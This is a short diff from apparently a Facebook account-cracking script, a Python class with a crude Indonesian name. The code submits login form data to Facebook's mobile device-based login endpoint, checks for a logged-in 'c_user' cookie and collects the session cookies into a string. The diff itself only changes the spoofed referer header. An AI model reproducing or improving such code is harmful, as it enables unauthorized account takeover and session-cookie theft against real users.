@@ -455,7 +455,7 @@ class ngentod:
                 	data.update({rom.get('name'): rom.get('value')})
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
-            ses.headers.update({'referer': 'https://m.facebook.com/ntdelegatescreen'})
+            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
             po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
